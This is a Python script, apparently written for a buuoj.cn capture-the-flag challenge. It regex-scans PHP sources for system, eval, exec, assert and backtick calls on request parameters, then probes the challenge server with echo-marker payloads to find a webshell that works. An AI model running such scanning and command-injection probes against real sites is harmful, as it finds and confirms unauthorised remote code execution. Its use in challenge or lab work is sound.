#!/usr/bin/env python3
"""
智能测试：从静态分析提取参数名，然后动态测试
"""
import os
import re
import requests
import time
import random
import string

BASE_URL = "http://01de7a39-b84f-4e29-afb6-cc13ed331efc.node5.buuoj.cn:81"
SRC_DIR = "src"
DELAY = 0.1

def generate_marker():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))

def test_shell(php_file, method, func, param):
    """测试单个shell"""
    marker = generate_marker()
    url = f"{BASE_URL}/{php_file}"
    
    try:
        if method == 'GET':
            if func in ['system', 'exec', 'passthru', 'shell_exec', 'backtick']:
                payload = {param: f'echo {marker}'}
            elif func == 'eval':
                payload = {param: f'echo "{marker}";'}
            elif func == 'assert':
                payload = {param: f'print("{marker}");'}
            else:
                payload = {param: f'echo {marker}'}
            r = requests.get(url, params=payload, timeout=5)
        else:
            if func in ['system', 'exec', 'passthru', 'shell_exec']:
                payload = {param: f'echo {marker}'}
            elif func == 'eval':
                payload = {param: f'echo "{marker}";'}
            elif func == 'assert':
                payload = {param: f'print("{marker}");'}
            else:
                payload = {param: f'echo {marker}'}
            r = requests.post(url, data=payload, timeout=5)
        
        if r.status_code == 429:
            print(f"[429] Rate limited, sleeping 30s...")
            time.sleep(30)
            return None
        
        if marker in r.text:
            return True
        
        return False
    except Exception as e:
        return None

def main():
    php_files = [f for f in os.listdir(SRC_DIR) if f.endswith('.php')]
    
    # 提取所有危险函数调用
    patterns = [
        (r"system\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'system'),
        (r"system\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'system'),
        (r"eval\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'eval'),
        (r"eval\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'eval'),
        (r"exec\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'exec'),
        (r"exec\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'exec'),
        (r"assert\s*\(\s*\$_GET\[\'([^\']+)\'\]", 'GET', 'assert'),
        (r"assert\s*\(\s*\$_POST\[\'([^\']+)\'\]", 'POST', 'assert'),
        (r"echo\s*`\{\\\$_GET\['([^']+)'\]\}`", 'GET', 'backtick'),
    ]
    
    shells = []
    for php_file in php_files:
        filepath = os.path.join(SRC_DIR, php_file)
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()
        
        for pattern, method, func in patterns:
            matches = re.findall(pattern, content)
            for param in matches:
                shells.append((php_file, method, func, param))
    
    print(f"[*] Found {len(shells)} potential shells")
    
    # 测试
    tested = 0
    for php_file, method, func, param in shells:
        result = test_shell(php_file, method, func, param)
        tested += 1
        
        if result:
            print(f"\n[+] FOUND: {php_file} - {method} {func}({param})")
            return php_file, method, func, param
        
        if tested % 500 == 0:
            print(f"[*] Tested {tested}/{len(shells)} shells...")
        
        time.sleep(DELAY)
    
    print(f"\n[*] Tested {tested} shells, none worked")
    return None

if __name__ == "__main__":
    found = main()
    if found:
        print(f"\n[+] Working shell: {found}")
